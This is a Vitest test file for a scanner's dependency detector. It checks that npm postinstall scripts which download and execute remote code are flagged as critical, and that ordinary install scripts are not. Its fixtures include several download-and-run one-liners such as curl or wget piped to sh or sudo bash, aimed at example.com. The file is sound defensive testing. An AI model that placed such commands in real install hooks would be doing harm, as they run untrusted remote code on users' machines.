import { describe, it, expect } from "vitest";
import type { ScanContext } from "@talaljaber/vibesafe-shared";
import { DependencyDetector } from "../../src/detectors/dependency-detector.js";
import { expectRubric } from "../helpers/rubric.js";

const scan = async (pkg: object) => {
  const ctx: ScanContext = {
    rootPath: "/f",
    projectContext: {} as ScanContext["projectContext"],
    files: ["package.json"],
    config: { rootPath: "/f" },
    readFile: async () => JSON.stringify(pkg),
  };
  const findings = await new DependencyDetector().detect(ctx);
  expectRubric(findings);
  return findings;
};

describe("DependencyDetector remote install scripts", () => {
  it("escalates download-and-run scripts to critical, even when private or || true", async () => {
    for (const cmd of [
      "curl -fsSL https://example.com/i.sh | sh",
      "wget -qO- https://example.com/i.sh | sudo bash || true",
      'sh -c "$(curl -fsSL https://example.com/i.sh)"',
      "bash <(curl -s https://example.com/i.sh)",
      'node -e "$(curl -s https://example.com/i.js)"',
      'node --no-warnings -e "$(curl -s https://example.com/i.js)"',
      "npx -y https://example.com/tool.tgz",
    ]) {
      const [f] = await scan({ private: true, scripts: { postinstall: cmd } });
      expect([f?.severity, f?.confidence, f?.ruleId], cmd).toEqual([
        "critical",
        "high",
        "dependency/risky-install-script",
      ]);
      expect(f?.title).toContain("downloads and runs a remote script");
    }
  });

  it("keeps the finding id stable through the escalation", async () => {
    const [a] = await scan({ scripts: { postinstall: "curl https://e.com/x | sh" } });
    const [b] = await scan({ scripts: { postinstall: "node setup.js" } });
    expect(a?.id).toBe(b?.id);
  });

  it("does not escalate ordinary install scripts", async () => {
    for (const cmd of [
      "prisma generate",
      "husky install",
      "curl -o file.tgz https://example.com/file.tgz",
      "npx prisma generate",
      "node scripts/setup.js",
    ]) {
      const [f] = await scan({ private: true, scripts: { postinstall: cmd } });
      expect([f?.severity, f?.title], cmd).toEqual([
        "low",
        'Risky lifecycle script: "postinstall"',
      ]);
    }
    const [g] = await scan({ scripts: { postinstall: "husky install" } });
    expect(g?.severity).toBe("high");
  });
});

describe("DependencyDetector command substitution as data", () => {
  it("does not escalate a node script that only receives downloaded data", async () => {
    const fs = await scan({
      scripts: {
        postinstall: 'node scripts/setup.js --latest "$(curl -s https://api.example.com/version)"',
      },
    });
    expect(fs.every((f) => f.severity !== "critical")).toBe(true);
  });

  it("does not treat a script's own -c flag as the interpreter's", async () => {
    const fs = await scan({
      scripts: { postinstall: 'node scripts/build.js -c "$(curl -s https://api.example.com/cfg)"' },
    });
    expect(fs.every((f) => f.severity !== "critical")).toBe(true);
  });
});
